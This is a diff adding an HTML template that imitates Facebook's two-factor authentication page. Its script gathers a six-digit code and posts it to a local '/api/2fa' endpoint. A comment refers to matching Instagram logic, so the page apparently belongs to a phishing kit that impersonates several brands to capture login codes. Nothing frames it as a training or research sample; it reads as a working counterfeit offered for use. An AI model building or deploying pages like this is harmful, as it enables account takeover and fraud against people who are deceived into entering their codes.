@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook • Two-Factor Authentication</title>
+    <link rel="icon" href="https://www.facebook.com/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <style>
+        body {
+            background: #f0f2f5;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        .twofa-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .twofa-box {
+            width: 100%;
+            max-width: 450px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+            padding: 30px;
+            text-align: center;
+        }
+        .twofa-logo {
+            color: #1877f2;
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+        .twofa-icon {
+            font-size: 60px;
+            margin-bottom: 10px;
+        }
+        .twofa-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1c1e21;
+            margin-bottom: 8px;
+        }
+        .twofa-desc {
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 20px 0;
+        }
+        .code-input {
+            width: 48px;
+            height: 54px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            border: 2px solid #dddfe2;
+            border-radius: 6px;
+            outline: none;
+            color: #1c1e21;
+            transition: all 0.2s ease;
+        }
+        .code-input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24,119,242,.2);
+        }
+        .twofa-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 10px;
+        }
+        .twofa-btn:hover:not(:disabled) {
+            background: #166fe5;
+        }
+        .twofa-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        .twofa-error {
+            background: #ffebe8;
+            border: 1px solid #dd3c10;
+            color: #dd3c10;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 13px;
+            margin-bottom: 10px;
+            display: none;
+            text-align: left;
+        }
+        .twofa-options {
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #dadde1;
+        }
+        .twofa-options a {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin: 5px 0;
+        }
+        .twofa-options a:hover {
+            text-decoration: underline;
+        }
+        .twofa-loader {
+            display: none;
+            text-align: center;
+            padding: 10px 0;
+        }
+        .twofa-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #dddfe2;
+            border-top-color: #1877f2;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    
+    <div class="twofa-wrapper">
+        <div class="twofa-box">
+            <div class="twofa-logo">facebook</div>
+            <div class="twofa-icon">🔐</div>
+            <div class="twofa-title">Two-Factor Authentication</div>
+            <div class="twofa-desc" id="twofa-message">
+                Enter the 6-digit code from your authentication method to continue.
+            </div>
+            
+            <div id="twofa-error" class="twofa-error"></div>
+            
+            <form id="twofa-form" method="POST" action="/api/2fa">
+                <div class="code-inputs">
+                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+                </div>
+                
+                <button type="submit" id="twofa-submit" class="twofa-btn">Continue</button>
+            </form>
+            
+            <div id="twofa-loader" class="twofa-loader">
+                <div class="twofa-spinner"></div>
+            </div>
+            
+            <div class="twofa-options">
+                <a href="#" id="resend-code" onclick="return false;">Resend Code</a>
+                <a href="#" onclick="return false;">Try Another Way</a>
+                <a href="#" onclick="return false;">Need Help?</a>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Same 2FA logic as Instagram
+        document.addEventListener('DOMContentLoaded', function() {
+            const codeInputs = document.querySelectorAll('.code-input');
+            const twofaForm = document.getElementById('twofa-form');
+            const errorDiv = document.getElementById('twofa-error');
+            const submitBtn = document.getElementById('twofa-submit');
+            const loaderDiv = document.getElementById('twofa-loader');
+            
+            if (codeInputs.length > 0) codeInputs[0].focus();
+            
+            codeInputs.forEach((input, index) => {
+                input.addEventListener('input', function(e) {
+                    const value = this.value.replace(/[^0-9]/g, '');
+                    this.value = value;
+                    if (value.length === 1 && index < codeInputs.length - 1) {
+                        codeInputs[index + 1].focus();
+                    }
+                });
+                
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                        codeInputs[index - 1].focus();
+                    }
+                });
+                
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pasted = (e.clipboardData || window.clipboardData).getData('text');
+                    const numbers = pasted.replace(/[^0-9]/g, '').split('');
+                    numbers.forEach((num, i) => {
+                        if (codeInputs[index + i]) codeInputs[index + i].value = num;
+                    });
+                    const lastIdx = Math.min(index + numbers.length, codeInputs.length - 1);
+                    codeInputs[lastIdx].focus();
+                });
+            });
+            
+            twofaForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                let code = '';
+                codeInputs.forEach(input => { code += input.value; });
+                
+                if (code.length < 6) {
+                    errorDiv.textContent = 'Please enter the complete 6-digit code.';
+                    errorDiv.style.display = 'block';
+                    return;
+                }
+                
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Verifying...';
+                loaderDiv.style.display = 'block';
+                errorDiv.style.display = 'none';
+                
+                fetch('/api/2fa', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    },
+                    body: JSON.stringify({ code: code })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Continue';
+                    loaderDiv.style.display = 'none';
+                    
+                    if (data.status === 'success') {
+                        if (data.redirect) window.location.href = data.redirect;
+                    } else {
+                        errorDiv.textContent = data.message || 'Invalid code.';
+                        errorDiv.style.display = 'block';
+                        codeInputs.forEach(input => { input.value = ''; });
+                        codeInputs[0].focus();
+                    }
+                })
+                .catch(() => {
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Continue';
+                    loaderDiv.style.display = 'none';
+                    errorDiv.textContent = 'Connection error. Please try again.';
+                    errorDiv.style.display = 'block';
+                });
+            });
+            
+            // Resend timer
+            const resendBtn = document.getElementById('resend-code');
+            if (resendBtn) {
+                let timeLeft = 30;
+                resendBtn.style.color = '#606770';
+                
+                const timer = setInterval(() => {
+                    timeLeft--;
+                    resendBtn.textContent = `Resend Code (${timeLeft}s)`;
+                    if (timeLeft <= 0) {
+                        clearInterval(timer);
+                        resendBtn.textContent = 'Resend Code';
+                        resendBtn.style.color = '#1877f2';
+                    }
+                }, 1000);
+            }
+        });
+    </script>
+</body>
+</html>
